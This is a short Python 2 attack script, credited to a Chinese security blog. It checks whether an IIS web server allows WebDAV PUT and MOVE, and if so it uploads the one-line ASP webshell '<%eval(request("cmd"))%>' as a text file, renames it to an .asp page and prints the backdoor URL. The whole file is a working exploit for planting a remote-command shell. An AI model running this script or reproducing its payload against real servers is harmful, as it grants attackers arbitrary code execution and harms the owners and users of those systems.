#!/usr/bin/env python
 
'''
IIS put file From http://www.lijiejie.com
 
Usage:
    iisPUT.py www.example.com:8080
'''
 
import httplib
import sys
 
try:
    conn = httplib.HTTPConnection(sys.argv[1])
    conn.request(method='OPTIONS', url='/')
    headers = dict(conn.getresponse().getheaders())
    if headers.get('server', '').find('Microsoft-IIS') < 0:
        print 'This is not an IIS web server'
        
    if 'public' in headers and \
       headers['public'].find('PUT') > 0 and \
       headers['public'].find('MOVE') > 0:
        conn.close()
        conn = httplib.HTTPConnection(sys.argv[1])
        # PUT hack.txt
        conn.request( method='PUT', url='/liyou666.txt', body='<%eval(request("cmd"))%>' )
        conn.close()
        conn = httplib.HTTPConnection(sys.argv[1])
        # mv hack.txt to hack.asp
        conn.request(method='MOVE', url='/liyou666.txt', headers={'Destination': '/li.asp'})
        print 'ASP webshell:', 'http://' + sys.argv[1] + '/li.asp'
    else:
        print 'Server not vulnerable'
        
except Exception,e:
    print 'Error:', e
